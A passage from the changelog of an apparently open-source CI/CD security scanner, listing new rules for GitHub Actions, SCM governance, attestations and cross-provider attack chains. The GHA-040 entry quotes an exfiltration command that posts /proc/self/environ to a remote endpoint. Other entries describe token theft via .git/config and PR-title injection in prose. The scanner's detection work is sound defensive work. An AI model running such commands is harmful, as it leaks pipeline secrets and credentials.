  ``FROM`` reference change with no review gate AND every
  subsequent build inherits whatever bytes the upstream registry
  currently serves under that tag. Two unrelated trust
  boundaries open at once with no compensating control to break
  the chain at. HIGH composite. SCM provider doc updated to
  list XPC-004..008. Catalog: 34 -> 35 chains.

- **Proof-of-exploit backfill on three critical GHA rules.**
  ``GHA-002`` (pwn-request), ``GHA-003`` (script injection), and
  ``GHA-019`` (token persistence) now ship an ``exploit_example``
  block. These three rules drive the XPC-004 / XPC-006 chain
  narratives — backfilling them means a reviewer who hits
  ``--explain`` on any of those chains sees the concrete attack
  payload (PR-title-injection string, fork-PR Makefile bomb,
  artifact-download exfil loop) inline rather than having to
  reconstruct it from prose. ``GHA-002`` also gained
  ``incident_refs`` citing the GitHub Security Lab pwn-request
  write-up and the Trail of Bits Codecov-style follow-up. Three
  new ``test_explain_renders_proof_of_exploit_for_*`` regression
  tests assert each snippet survives the orchestrator backfill.

- **GHA-040: known-compromised action ref detection (foundation
  rule of the GHA-04x action-reputation pack).** Pure-data lookup
  against a curated registry in
  ``pipeline_check.core.checks.github._compromised_actions``: a
  table of ``(owner/repo, malicious_ref_predicate, advisory)``
  entries sourced from public CVEs / GHSAs. The rule walks every
  workflow's ``steps[].uses:`` and ``jobs.<id>.uses:`` references
  and fires CRITICAL when any matches a known-compromised SHA or
  tag. Initial registry covers tj-actions/changed-files
  (CVE-2025-30066) and reviewdog/action-setup (CVE-2025-30154).

  Distinct from GHA-001 (prevents the *vulnerability* — tag pin
  instead of SHA pin) and GHA-025 (catches mass-renaming
  primitives): GHA-040 catches the *active compromise*, when the
  workflow is pinned to a specific ref a public advisory has
  flagged. ``--explain GHA-040`` includes the
  ``exploit_example`` showing both the compromised SHA pin and
  the post-incident clean SHA the maintainer published, with the
  exact attack payload (``curl -X POST .../exfil -d
  "$(cat /proc/self/environ)"``) so the operator can audit logs
  for the same shape.

  Deliberately a pure-data lookup, no network access — refresh
  is a manual code change reviewed through the normal PR flow.
  Avoids taking on a telemetry / advisory-fetch surface that
  would change the project's no-network-by-default posture.

  Standards mappings: OWASP CICD-SEC-3, CIS SSCS 1.4.1 + 3.1.3,
  OpenSSF Scorecard Pinned-Dependencies. CWE-829 + CWE-506.
  GitHub provider catalog: 42 -> 43 rules. Foundation for
  follow-up rules in the GHA-04x range (GHA-041 single-maintainer
  action, GHA-042 very-young-repo action — both will require an
  opt-in network fetcher path).

- **XPC-007 cross-provider chain: unpinned actions with no
  automated remediation.** Fourth SCM-touching chain. Fires when
  ``GHA-001`` (workflow ``uses:`` references aren't SHA-pinned)
  and ``SCM-005`` (Dependabot security updates disabled) both
  fail in the same multi-provider scan. The composite spans the
  full upstream-compromise lifecycle: GHA-001 is the immediate-
  exposure primitive (a maintainer-account compromise propagates
  to the next workflow run), SCM-005 is the absent-remediation
  primitive (no automated PR opens when the public CVE drops).
  The tj-actions/changed-files March 2025 incident
  (CVE-2025-30066) is the canonical instance: tag-pinned
  consumers got malicious code immediately, Dependabot-disabled
  consumers had no in-flight PR to move them off it after the
  advisory landed. SCM provider doc updated to list
  XPC-004 / -005 / -006 / -007 in the cross-provider-chains
  section. Catalog: 33 -> 34 chains.

- **XPC-006 cross-provider chain: unreviewed fork-PR privilege
  escalation.** Third SCM-touching chain. Fires when ``SCM-002``
  (default branch protection does not require approving reviews)
  and ``GHA-002`` (workflow uses ``pull_request_target`` and
  checks out PR head — the canonical "pwn request" primitive)
  both fail in the same multi-provider scan. The composite says:
  there is no human-review gate either to *introduce* the
  pwn-request primitive (one compromised maintainer adds it and
  self-merges) or to *remove* it after detection (the same gate-
  skip lets the malicious workflow stay). CRITICAL composite —
  matches GHA-002's severity, escalated by the introduction-
  without-review angle. Anchored to MITRE T1078.004 / T1199 /
  T1195.002. SCM provider doc updated to list XPC-004 / XPC-005 /
  XPC-006 in the cross-provider-chains section. Catalog: 32 -> 33
  chains.

- **SCM provider doc page (`docs/providers/scm.md`).** The
  ``gen_provider_docs.py`` registry now includes the SCM provider,
  so the auto-generated reference page renders alongside every
  other provider's. Hand-written header documents the producer
  workflow, the three FP-prevention guards (empty / archived /
  meta-unavailable), the rule-family layout (presence rules,
  review rules, security_and_analysis rules, signed-commits,
  enforce-admins meta-rule), and the cross-provider chains the
  SCM findings participate in (XPC-004, XPC-005). Wired into the
  mkdocs nav and the providers/README.md card grid.

- **XPC-005 cross-provider chain: end-to-end provenance gap.**
  Second SCM-touching chain. Fires when ``SCM-006`` (default
  branch protection does not require signed commits) and
  ``GHA-006`` (workflow doesn't sign release artifacts) both fail
  in the same multi-provider scan. The composite says: the
  delivery pipeline lacks a cryptographic chain of custody at
  either boundary; consumers can't verify what built from what,
  every release is trust-on-first-use. SLSA Build L3 specifically
  requires both legs to close. Catalog: 31 -> 32 chains.

- **SCM provider FP/FN audit pass.** Walked every SCM-NNN rule
  for the systemic false-positive / false-negative modes a
  GitHub-API-driven posture scanner has to absorb:

  * **Archived-repo guard.** GitHub auto-disables Dependabot,
    secret scanning, secret-scanning push protection, code
    scanning, and private vulnerability reporting on archived
    repos. SCM-003 / SCM-004 / SCM-005 / SCM-015 / SCM-016 now
    detect ``repo_meta.archived: true`` (and the sibling
    ``disabled: true`` admin-suspension flag) and pass with a
    ``Skipped: archived repo`` note instead of FPing on every
    archived repo's failure-by-platform-default. Branch-protection
    rules deliberately still evaluate on archived repos — the
    audit-trail signal stays meaningful even when the repo is
    read-only.
  * **Empty-repo guard.** A brand-new repo with no commits has
    no default branch, so the protection endpoint legitimately
    404s. SCM-001 now detects ``repo_meta.size == 0`` plus
    ``default_branch_protection is None`` and passes with an
    ``Empty repo`` note. The 10 cascading branch-protection
    rules already pass silently when SCM-001 has nothing to
    evaluate.
  * **Repo-metadata-unavailable guard.** When the
    ``repos/{owner}/{repo}`` fetch itself fails (token without
    read access, deleted repo, network failure), ``for_repo``
    no longer probes ``branches/main/protection`` — the previous
    behavior would FP on any repo whose default branch isn't
    literally ``main``. SCM-001 surfaces a ``Repo metadata
    unavailable`` finding so the gap is visible rather than
    silent.
  * **Documented FN modes.** SCM-002 and SCM-008 added
    ``known_fp`` notes explaining the
    ``bypass_pull_request_allowances`` and ``restrictions``
    blocks the rules don't currently consult, so reviewers
    auditing a passed finding know to spot-check the allowlists
    in the GitHub UI.
  * **Inventory enrichment.** ``--inventory`` output for SCM
    repos now surfaces ``archived`` / ``disabled`` flags so
    operators can correlate skipped findings with platform
    state at glance.

  New helpers in ``pipeline_check.core.checks.scm.base``:
  ``is_archived``, ``is_disabled``, ``is_empty_repo``,
  ``archived_state_label``. Six FP-regression test classes plus
  six whole-pack integration sweeps lock the guard behavior.

- **SCM provider fourth wave: review-time and disclosure controls.**
  Six new rules, bringing the SCM rule pack from 10 to 16 and
  filling out the CIS SSCS Source Code section beyond the
  protection-knob set. ``SCM-011`` (CODEOWNERS reviews not
  required, CIS 1.1.5 + Scorecard Code-Review), ``SCM-012``
  (stale reviews not dismissed on new pushes, CWE-367
  time-of-check / time-of-use class), ``SCM-013`` (conversation
  resolution not required), ``SCM-014`` (most-recent-push
  approval not required, blocks the two-account-collab review
  bypass), ``SCM-015`` (secret-scanning push protection
  disabled — the *prevent* step paired with SCM-004's *detect*),
  ``SCM-016`` (private vulnerability reporting disabled —
  structured maintainer-only disclosure channel).

  Standards back-fill: SCM-011/012/013/014 map to OWASP
  CICD-SEC-1, CIS 1.1.5, and OpenSSF Scorecard's Code-Review.
  SCM-015 maps to OWASP CICD-SEC-6 + CIS 1.5.1. SCM-016 maps to
  OWASP CICD-SEC-10 + CIS 1.4.1.

- **XPC-004 cross-provider chain: token persistence on an
  unprotected default branch.** First chain that composes an SCM
  governance failure with a workflow credential-handling failure.
  Fires when ``SCM-001`` (no branch protection rule) or ``SCM-007``
  (force-pushes allowed) is failing alongside ``GHA-019`` (workflow
  persists ``GITHUB_TOKEN`` or another secret into build output) in
  the same multi-provider scan. Composite severity is CRITICAL: the
  attacker primitive collapses from "compromise the build runtime"
  to "open a PR, fetch the next build's artifacts." The chain
  recommendation lists both fixes; either alone breaks it but
  protection is the durable control. Catalog: 30 -> 31 chains.

- **SCM posture provider third wave: branch-protection rounding-out.**
  Two more rules covering the remaining branch-protection knobs:
  ``SCM-009`` (default branch allows deletions, CIS 1.1.17 sibling
  to SCM-007) and ``SCM-010`` (branch protection rule does not
  enforce against administrators — every other knob becomes
  advisory when admins can bypass). SCM-010 supports both the
  modern nested ``{enabled: bool}`` and legacy bare-boolean shapes
  of ``enforce_admins``. Standards back-fill: both new rules map
  to ``cis_supply_chain``, ``openssf_scorecard`` (Branch-Protection)
  and ``owasp_cicd_top_10``. SCM provider catalog: 8 -> 10 rules.

- **SCM posture provider second wave: CIS SSCS Source Code coverage.**
  Five new rules anchored to the CIS Software Supply Chain Security
  Guide v1.0 Source Code section: ``SCM-004`` (secret scanning
  disabled, CIS 1.5.1), ``SCM-005`` (Dependabot security updates
  off, CIS 1.1.8), ``SCM-006`` (signed commits not required on the
  default branch, CIS 1.1.6), ``SCM-007`` (default branch allows
  force-pushes, CIS 1.1.17), ``SCM-008`` (no required status
  checks on the default branch, CIS 1.1.5 + 1.1.7). SCM-004 and
  SCM-005 read ``security_and_analysis.<feature>.status`` from the
  repo metadata payload via a new ``security_feature_state``
  helper; the ``known_fp`` block on each calls out the
  token-without-admin-scope case so users can distinguish "really
  disabled" from "I lacked visibility." SCM-002 and SCM-003
  back-fill ``exploit_example`` for catalog consistency.

  Standards back-fill: every SCM rule now maps to ``cis_supply_chain``
  (with new Source Code controls 1.1.5 / 1.1.6 / 1.1.7 / 1.1.8 /
  1.1.17 / 1.5.1 added to the controls dict) and to
  ``openssf_scorecard``. The Scorecard module's docstring updates
  to reflect that Branch-Protection is now evidenced (it was
  previously listed as "outside this scanner's scope"); Code-Review
  upgrades from "partially evidenced" to "evidenced"; SAST adds
  the SCM-003 evidence path; Dependency-Update-Tool and
  Vulnerabilities pick up SCM-005. SCM provider catalog: 3 -> 8
  rules. Catalog total: 575 checks.

- **SCM posture provider (`--pipeline scm`).** New provider that
  scans GitHub repository governance via the REST API: branch
  protection, required pull-request reviews, default code scanning,
  and (in subsequent waves) secret scanning, Dependabot status,
  CODEOWNERS coverage, runner-group restrictions, OIDC trust
  policies. Token comes from ``--gh-token`` or ``$GITHUB_TOKEN``;
  zero telemetry. ``--scm-fixture-dir DIR`` reads JSON responses
  from disk for offline / CI test runs that don't hold a token.
  First wave ships three rules: ``SCM-001`` (default branch has no
  protection rule), ``SCM-002`` (protection rule but no required
  reviews), ``SCM-003`` (default code scanning not enabled). Each
  rule is anchored to OWASP CICD-SEC top-10 controls, carries
  ``incident_refs`` for the SCM-related package compromise pattern,
  and ``SCM-001`` ships with an ``exploit_example`` showing the
  unprotected-default-branch attack sequence. Closes the largest
  competitive gap with Legitify and OpenSSF Scorecard, neither of
  which scans pipeline-config files. Provider catalog: 18 -> 19.

- **Composite-action body resolution in ``--resolve-remote``.** The
  GHA resolver now walks ``steps[].uses:`` references in addition to
  the existing ``jobs.<id>.uses:`` walk. SHA-pinned remote action
  refs (``owner/repo@<sha>`` or ``owner/repo/subdir@<sha>``) trigger
  a fetch of ``action.yml`` (with ``action.yaml`` fallback) at the
  pinned commit. When the parsed body declares ``runs.using:
  composite``, its ``runs.steps`` are synthesized into a one-job
  ``Workflow`` (the fake job is named ``__composite__`` with a
  synthetic ``runs-on``). The synthesized workflow flows through the
  existing rule pack, so issues hidden inside a third-party
  composite — unpinned ``actions/checkout``, curl-pipe install
  scripts, literal AWS keys — light up exactly as if the caller
  wrote them inline. JavaScript (``node20``, ``node16``) and Docker
  actions are fetched and parsed but not synthesized (their
  executable surface is bytecode / OCI, outside the YAML rule
  pack); the count surfaces in the per-scan warnings stream as
  ``[gha-resolver] skipped N non-composite action(s)``. Composite-
  of-composite recursion falls out of the wave queue automatically:
  a synthesized composite's ``steps[]`` flow back through
  ``_collect_remote_uses`` on the next wave, bounded by the same
  ``--gha-resolve-depth``. The resolver dedup key now incorporates
  fetch kind so a workflow ``foo.yml@SHA`` and an action subpath
  ``foo`` at the same SHA don't collide. Closes the largest
  parity gap with Zizmor / Poutine for GitHub Actions analysis.

- **Proof-of-exploit snippets on rules (``Rule.exploit_example``).**
  New optional ``exploit_example: str | None`` field on the rule
  dataclass carries the minimal payload, manifest fragment, or
  attack sequence that demonstrably triggers the failure mode the
  rule detects. Surfaced by ``pipeline_check --explain`` under a new
  ``[Proof of exploit]`` section (multi-line code blocks render
  verbatim) and by the HTML report drawer in a monospace
  pre-formatted block. The orchestrator backfills
  ``Finding.exploit_example`` from the rule the same way it already
  backfills ``incident_refs`` and ``cwe`` (every YAML / Dockerfile /
  K8s / OCI / Helm / AWS / custom-rule provider). Initial population
  covers the same five marquee rules already carrying
  ``incident_refs``: ``GHA-001`` (tag-pinned action force-move),
  ``GHA-008`` (literal AWS key + post-leak rotation cost),
  ``GHA-016`` (curl-pipe payload swap), ``K8S-013`` (hostPath /
  read of kubelet credentials), ``DF-002`` (root-container path to
  CVE-2019-5736 and CVE-2022-0492). Distinguishes the catalog from
  generic recommendation prose by giving every reviewer the
  concrete attack instead of asking them to infer it.

- **Attestation content checks (``ATTEST-NNN`` family, phase 1 +
  ``ATTEST-001``).** The OCI provider now reads in-toto Statement
  content from attestation manifests when the input is an OCI
  image-layout directory (the ``blobs/<algo>/<digest>``
  filesystem layout the spec defines). For each attestation
  manifest entry, the resolver follows the layer digests into the
  ``blobs/`` tree, parses each ``application/vnd.in-toto+json``
  payload as an in-toto Statement, optionally unwraps a DSSE
  envelope (cosign-attested case), and surfaces the parsed result
  on ``OCIManifest.attestations``. Both v0.1 and v1 Statement
  shapes are recognized; predicate types (SLSA provenance v0.2 /
  v1, SPDX, CycloneDX) are kept verbatim so the rule layer can
  dispatch.

  ``ATTEST-001`` checks the SLSA provenance ``builder.id`` claim
  against an allowlist of recognized hosted-CI builders
  (slsa-github-generator, GitHub-hosted runners, Buildkite,
  Cloud Build, GitLab SaaS, CircleCI, Buildx). Fires when the
  builder is self-hosted (``/self-hosted``, ``localhost``,
  ``127.0.0.1`` markers) or unknown, because a tampered
  self-hosted runner can emit a syntactically-valid attestation
  for the wrong source. Reads ``predicate.builder.id`` (SLSA
  v0.2) or ``predicate.runDetails.builder.id`` (SLSA v1) so both
  spec versions resolve.

  Distinct from OCI-002 (presence): OCI-002 fires when no
  attestation manifest is attached at all; ATTEST-001 fires when
  the attestation IS present but names an untrusted builder.
  Operators landing on a passing OCI-002 + failing ATTEST-001
  see "the bytes are attested but by a builder I shouldn't
  trust", which is meaningfully different from "no attestation
  at all". The roadmap calls this out as the strongest
  differentiator from peers, no OSS scanner does pipeline-side
  attestation content analysis today; they verify *something*
  was attested, not *what* was attested.

  ``ATTEST-002`` (source-repo claim consistency, *landed*) reads
  the source URI + digest from the predicate. v0.2:
  ``predicate.invocation.configSource``. v1.0:
  ``buildDefinition.externalParameters`` (canonical GHA path
  ``.workflow.repository``; alternative ``.source.uri``; fallback
  walks every string for a VCS URI shape) +
  ``resolvedDependencies[*].digest``. Fires when the URI is
  missing, a placeholder (``unknown``, ``n/a``, ``tbd``, etc.),
  malformed (no scheme), or when the digest is missing or
  all-zeros (the bytes aren't pinned). Anchored to SolarWinds
  2020: the build system pulled tampered source from an
  unauthorized branch via SUNSPOT, producing 'authentic' signed
  builds for code the team never wrote. A pinned, verified
  source-repo claim is the SLSA L2+ control specifically meant
  to detect that shape.

  ``ATTEST-003`` (SBOM floating-version detection, *landed*)
  walks every SBOM attestation (predicate types under
  ``https://spdx.dev/Document`` or ``https://cyclonedx.org/bom``)
  and classifies each declared package's version as pinned or
  floating. Floating shapes: empty / missing / ``latest`` / ``*``
  / branch names (``main``, ``master``, ``head``, ``stable``,
  ``edge``, ``rolling``) / bare-major (``v1``, ``42``).
  Pinned shapes: semver, calver, hex digests (32+ chars), and
  any string with at least one numeric component for best-effort
  release tags. A signed SBOM declaring ``openssl@latest`` is
  worse than no SBOM, vulnerability-scanning tooling produces
  false negatives because the version it queries CVE databases
  for is unstable. Anchored to Log4Shell (CVE-2021-44228):
  organizations with pinned SBOMs shipped patches in hours;
  those without spent days auditing builds to discover what
  they actually shipped.

- **Per-repo false-positive annotation store (``--annotate-fp``).**
  ``pipeline_check --annotate-fp CHECK_ID RESOURCE`` records a
  confirmed false positive into a local ``.pipeline-check-fp.json``
  file and exits without scanning. Subsequent scans demote that
  ``(check_id, resource)`` pair's confidence one rung (HIGH ->
  MEDIUM, MEDIUM -> LOW), keeping the finding visible in reports
  while letting ``--min-confidence MEDIUM`` filter it out at the
  gate. Idempotent: re-running with the same args is a no-op so
  CI scripts can call it without accumulating duplicates.

  ``--fp-file PATH`` overrides the annotation file location.
  ``pipeline_check fp-stats`` (new subcommand) prints rule -> vote
  totals so rule authors see which rules accumulate the most
  false-positive votes across the repo, feeding triage prioritization.

  Distinct from ``--ignore-file``: suppression *removes* the finding
  from reports entirely; FP annotation *demotes confidence* so the
  finding stays visible (audit trail) but defaults to filtered at
  realistic gate thresholds. The annotation file is local and
  travels with the repo, so demotion is a property of the codebase
  rather than any one developer's machine. No telemetry, no
  upload. ``confidence_locked`` rules opt out of FP demotion: rules
  emitting confidence with intent (e.g. CB-005 two-versions-behind
  HIGH) shouldn't be calibrated by user feedback.

- **Tekton ``taskRef:`` cross-document resolution for TAINT-006.**
  When a ``Pipeline`` task uses ``taskRef: { name: <X> }`` instead
  of inlining a ``taskSpec:`` block, the taint graph now resolves
  ``X`` against ``Task`` / ``ClusterTask`` documents loaded into
  the same ``TektonContext`` and treats the resolved ``spec`` as
  if it were inline. Closes the v1 limitation called out in
  TAINT-006's docs_note: a Pipeline that splits the producer /
  consumer task definitions across separate files now trips the
  rule the same way a fully-inline Pipeline does. ``bundle:`` /
  ``resolver:`` (remote OCI / Tekton-resolver-framework
  references) stay unresolved, the scanner deliberately doesn't
  fetch over the network. The ``analyze_pipeline_doc(doc)`` API
  gains an optional ``ctx`` parameter; legacy callers passing
  only ``doc`` keep the pre-resolver behavior (``taskRef:``
  silently skipped) for backward compatibility.

  The task index is keyed on the composite ``(kind, name)`` so a
  ``Task`` and a ``ClusterTask`` with the same metadata name stay
  distinct (they're separate Tekton resources and the rule must
  pick the one matching ``taskRef.kind``). ``taskRef.kind``
  defaults to ``"Task"`` per Tekton's webhook-defaulting
  behavior; explicit ``kind: ClusterTask`` looks up the cluster-
  scoped variant. If the explicit-kind lookup misses, the
  resolver falls back to the other Tekton kind so a refactor
  (Task -> ClusterTask) keeps resolving without every consumer
  updating its ``taskRef.kind``.

- **GitLab ``include:`` cross-document resolver.** Local ``include:``
  directives in ``.gitlab-ci.yml`` are now followed at load time so
  cross-job rules see jobs and variables defined in included files.
  Closes the long-standing TAINT-008 ``extends:`` taint gap: a hidden
  template (``.base``) defined in an included file is now reachable
  from the parent's ``extends:`` chain and the taint analyzer walks
  through it correctly. Prior behavior would silently miss taint
  flowing across the include boundary because the hidden template
  was invisible to the rule engine.

  Supported forms: ``include: foo.yml``, ``include: [a.yml, b.yml]``,
  ``include: { local: foo.yml }``, ``include: [{local: a}, ...]``.
  Other forms (``remote:``, ``project:``, ``template:``,
  ``component:``) emit a warning and the scan continues; the
  scanner deliberately does not fetch over the network.

  Cycle detection (visited-set), depth cap (10 levels), parent-wins
  on key conflicts (matches GitLab's "consumer overrides include"
  semantics for jobs). The original ``include:`` block is preserved
  in the merged data so include-pinning rules (GL-005, GL-011,
  GL-030) continue to fire on the original directive. Per-line
  source positions survive the merge because the resolver mutates
  the parent dict in place rather than copying it (preserves the
  ``LineDict`` subclass that carries line numbers for every
  ``Location`` reporters render).

  Path-traversal guard: ``--gitlab-path`` (or its parent for a
  single-file path) is the fixed scan root. Leading-``/`` paths
  anchor to that root (matches GitLab's "full path relative to the
  repository root" semantics) rather than to the changing
  ``base_dir`` during recursion, so deeply-nested includes still
  resolve repo-root paths correctly. Any include whose resolved
  path escapes the scan root via ``..`` traversal is rejected with
  a warning rather than read, so a malicious ``.gitlab-ci.yml`` in
  an untrusted repo can't make the scanner read arbitrary host
  files. ``..`` segments that resolve back inside the scan root
  (a common monorepo pattern) are still allowed.

- **Soon-to-expire suppression forewarning.** ``GateResult`` gains
  ``expiring_soon: list[IgnoreRule]`` populated for any ignore-file
  entry whose ``expires:`` date falls within
  :data:`pipeline_check.core.gate.EXPIRY_WARNING_DAYS` (14 days
  default) of the current run. The CLI renders each as ``[gate]
  ignore rule expires in N day(s) on YYYY-MM-DD: CHECK-ID:resource
  (still suppressing, but plan to revisit)`` so the team sees the
  forewarning in regular scan output before the suppression
  actually flips to a hard finding. Rounds out the partially-
  landed suppression-with-expiry feature: previously the gate
  only surfaced rules already expired (the suppression already
  gone); now operators get a 14-day heads-up so they schedule a
  revisit before CI fails.

- **Per-rule real-world incident references (``incident_refs``).**
  New optional field on ``Rule`` that anchors a check to concrete
  CVEs and breach postmortems where the same pattern caused
  damage in the wild. Surfaced under a "Seen in the wild"
  section in three places: ``pipeline_check --explain CHECK_ID``,
  the per-finding HTML report drawer, and the auto-generated
  ``docs/providers/<name>.md`` reference. The HTML reporter
  autolinks embedded ``https://`` URLs so CVE links stay
  clickable.

  Initial population covers nine marquee rules:

  - ``GHA-001`` (tj-actions/changed-files CVE-2025-30066,
    reviewdog/action-setup CVE-2025-30154)
  - ``GHA-003`` (GitHub Security Lab disclosure, Trail of Bits
    pwn-request research)
  - ``GHA-006`` (SolarWinds Orion compromise, PyTorch
    torchtriton hijack)
  - ``GHA-008`` (Uber 2016 access-key leak, GitGuardian
    secrets-sprawl reports)
  - ``GHA-016`` (Codecov 2021 Bash uploader compromise)
  - ``K8S-013`` (CVE-2021-25741 hostPath subpath escape,
    TeamTNT/Kinsing campaigns)
  - ``K8S-020`` (Tesla 2018 dashboard compromise, Argo CD
    CVE-2022-24348/24768 chain)
  - ``DF-001`` (Docker Hub typosquatting, codecov-action tag
    mutation post-incident)
  - ``DF-002`` (CVE-2019-5736 runC escape, CVE-2022-0492
    cgroups v1 release_agent escape)

  Anchors abstract security debt to a concrete cost the
  operator's manager has already heard of.

  Mechanically: the ``Rule`` dataclass gains an
  ``incident_refs: tuple[str, ...]`` field; ``Finding`` mirrors
  it as ``list[str]``; every provider orchestrator backfills the
  finding's copy from the rule the same way it already backfills
  ``cwe``. Empty for rules without a public incident on record;
  the section silently disappears in those cases.

- **Auto-detect / no-args mode.** ``pipeline-check`` with no flags
  now walks cwd for every provider's canonical file (``.github/
  workflows``, ``.gitlab-ci.yml``, ``Jenkinsfile``, ``Dockerfile``,
  ``Chart.yaml``, ``template.yml``, etc.) and routes the scan
  accordingly: a single match runs through :class:`Scanner`
  unchanged; two or more matches automatically switch to
  :class:`MultiScanner` so cross-provider attack chains
  (``XPC-NNN``) fire on the union of every sub-scan's findings,
  the same way ``--pipelines github,oci`` did when invoked
  explicitly. Emits ``[auto] detected providers: github, dockerfile
  (running --pipelines github,dockerfile)`` to stderr so the
  routing decision is visible. Helm + Kubernetes disambiguation:
  when ``Chart.yaml`` is present alongside a ``kubernetes/`` /
  ``k8s/`` / ``manifests/`` directory the Kubernetes provider is
  dropped (helm renders templates and feeds them to the K8s rule
  pack, scanning both would double-count). OCI is deliberately
  omitted from the auto-detect table because ``index.json`` is
  too generic a filename to promote on presence alone; pass
  ``--pipeline oci`` or ``--pipelines github,oci`` explicitly to
  bring an OCI manifest into the scan.

  Replaces the ``--pipeline X --X-path Y`` ceremony for the
  common case; explicit flags stay for power users. The
  underlying detection table is shared between single- and
  multi-detect (``_PROVIDER_DETECT_FILES``) so a new provider
  hooks into both detection modes by adding one row.

## [0.5.0] - 2026-05-10

### Added

- **MCP (Model Context Protocol) server (``--serve``).** Locally-
  running MCP server that lets AI clients (Claude Desktop,
  Claude Code, Cursor, Continue, Zed) drive scans and
  introspect the rule catalog directly. stdio transport, ten
  tools advertised: ``list_providers``, ``list_checks``,
  ``explain_check``, ``list_chains``, ``explain_chain``,
  ``list_standards``, ``scan``, ``inventory``, ``threat_model``,
  ``scan_markdown``. Every tool returns JSON-serializable data
  with input schemas validated on each call; errors come back
  as ``{"error": ...}`` payloads, never as raw stack traces.

  The ``mcp`` Python SDK is an *optional* extra to keep the
  default install slim. Install with
  ``pip install 'pipeline-check[mcp]'``. The CLI flag fails with
  exit 3 + an actionable message when the extra is missing.

  Architecture splits ``pipeline_check/mcp_server/tools.py``
  (pure functions wrapping the existing Scanner / registries,
  no SDK import) from ``pipeline_check/mcp_server/server.py``
  (binds tool functions to MCP request types, runs the asyncio
  stdio loop). The split keeps tool logic unit-testable without
  spinning up an MCP loop and lets future transports (HTTP+SSE,
  streamable-http) reuse the same tool surface.

  Claude Desktop / Claude Code config snippets in ``docs/mcp.md``.

- **STRIDE threat-model generator (``--output threatmodel``).**
  New output format that emits a self-contained Markdown
  threat-model document populated from the same scan output
  the JSON / HTML / SARIF reporters consume: findings,
  optional inventory components, optional attack chains.
  Document sections: Scope, Trust boundaries (heuristics keyed
  on the provider mix in inventory), Assets (the inventory
  itself), STRIDE analysis (failing findings grouped by
  category), Implemented controls (passing-check counts per
  STRIDE bucket), Risk register (top 25 failures), and a
  Methodology footer. Selecting ``--output threatmodel``
  auto-runs the inventory pass so a one-flag invocation
  produces a populated document.

  The OWASP CICD Top 10 -> STRIDE mapping is policy in
  ``threatmodel_reporter.py``: each OWASP control maps to one
  or more STRIDE codes (e.g. CICD-SEC-6 -> Information
  Disclosure + Spoofing), and a small CWE prepend table
  refines the head when an exact CWE is more specific than
  the OWASP fallback (CWE-200 -> Information Disclosure;
  CWE-269 -> Elevation of Privilege; CWE-778 -> Repudiation).
  No rule registry changes. Re-policing is a pure-function
  swap.

  Output is shaped for SOC 2 / PCI / NIST SSDF evidence
  packages and architecture-review docs; the risk register
  caps at 25 rows so the document stays printable, while the
  JSON output remains unbounded for downstream tooling.

- **GL-033 global before_script / after_script taint
  propagation.** New rule. ``iter_jobs`` deliberately skips
  top-level keywords (``before_script``, ``after_script``,
  ``default``, ``image``, ``services``, ``variables``,
  ``stages``, ``workflow``, ``include``, ...), which means
  GL-002's per-job injection scan never sees a tainted
  ``$CI_COMMIT_TITLE`` interpolation in a document-root
  ``before_script:`` or ``default.before_script:`` even
  though it propagates to every job in the pipeline. GL-033
  closes that gap by scanning document-root ``before_script:``,
  ``after_script:``, and ``default.before_script:`` /
  ``default.after_script:`` for the same attacker-
  controllable predefined CI variables tracked by GL-002.
  Severity HIGH because the injection reach is N times the
  per-job equivalent (one global script line is N injections
  in N jobs at once).

  GitLab catalog: 32 -> 33.

- **GHA-039 services / container credentials literal.** New
  rule, peer-tool gap closure (Zizmor's
  ``hardcoded-container-credentials``). Flags any literal
  value in a job-level ``container.credentials.{username,
  password}`` field or a ``services.<name>.credentials.{
  username, password}`` field. GHA-008 catches credential
  **shapes** (AWS keys, JWTs, Slack tokens) but not generic
  passwords like ``hunter2`` or registry usernames; GHA-039
  catches them by **position**, anything literal in those
  fields is by definition a leaked credential. Empty strings
  and the documented ``anonymous`` / ``guest`` / ``public``
  / ``noauth`` sentinel usernames are treated as safe.
  ``${{ secrets.* }}`` references (full-string or inline)
  pass. Severity CRITICAL because the value lands in the
  runner's start banner of every build log.

  GHA catalog: 38 -> 39.

- **GHA-037 / GHA-038. Peer-tool gap closure.** Two new GHA
  rules covering exploit classes that Zizmor / Checkov /
  StepSecurity audit but pipeline-check missed.

  - **GHA-037 actions/checkout persist-credentials.** Flags
    ``actions/checkout`` steps that omit ``persist-credentials:
    false`` (the v3 / v4 default of ``true``) or set it to
    ``true`` explicitly. The default writes the GITHUB_TOKEN
    into ``.git/config`` as an
    ``http.https://github.com/.extraheader`` line, where any
    subsequent ``run:`` step in the same job can read it via
    ``git config --get http.https://github.com/.extraheader``
    and exfiltrate. Real-world exploit chains (Ultralytics
    2024 RCE, multiple Mend / Snyk advisories) leverage
    exactly this primitive. Sister rule GHA-019 catches the
    explicit ``echo $GITHUB_TOKEN > file`` shape; GHA-037
    catches the implicit checkout-default that doesn't go
    through a ``run:`` line at all. Zizmor calls this
    failure pattern *Artipacked*.
  - **GHA-038 ACTIONS_ALLOW_UNSECURE_COMMANDS.** Flags
    workflows that set ``ACTIONS_ALLOW_UNSECURE_COMMANDS=true``
    at the workflow / job / step env level. The flag re-
    enables the retired ``::set-env::`` / ``::add-path::``
    workflow commands which inject through the runner's
    stdout, any tool's diagnostic line starting with ``::``
    becomes an injection vector. Sister rule GHA-031
    catches direct uses of ``::set-output::`` /
    ``::save-state::`` in step scripts; GHA-038 catches the
    explicit re-enable flag, which is strictly worse because
    it accepts every ``::set-env::`` line on stdout, not just
    the workflow author's own ``echo`` commands.

  GHA catalog: 36 -> 38.

- **DR-011 Drone node-map runner targeting.** New rule.
  Flags Drone pipelines whose ``node:`` map (the runner-
  selection block) interpolates a pusher-controllable Drone
  variable (``${DRONE_BRANCH}`` / ``${DRONE_PULL_REQUEST_*}``
  / ``${DRONE_COMMIT_AUTHOR}`` / ``${DRONE_COMMIT_MESSAGE}``
  / ``${DRONE_TAG}`` etc.). The pusher controls which runner
  pool the pipeline lands on, including a privileged pool
  reserved for deploys. Closes Drone's parity with the same
  pattern in BK-015 / GHA-036 / GL-032 / JF-032 / ADO-030 /
  CC-031. Drone catalog: 10 -> 11.

- **BK-015 / TKN-015 / ARGO-015.** Three follow-on rules
  closing distinct gaps:

  - **BK-015 agents-map interpolation.** Flags Buildkite
    pipelines whose top-level ``agents:`` map or per-step
    ``agents:`` override interpolates a pusher-controllable
    Buildkite variable (``$BUILDKITE_BRANCH`` /
    ``$BUILDKITE_TAG`` / ``$BUILDKITE_PULL_REQUEST_*`` /
    ``$BUILDKITE_BUILD_AUTHOR`` etc.). The pusher gets to
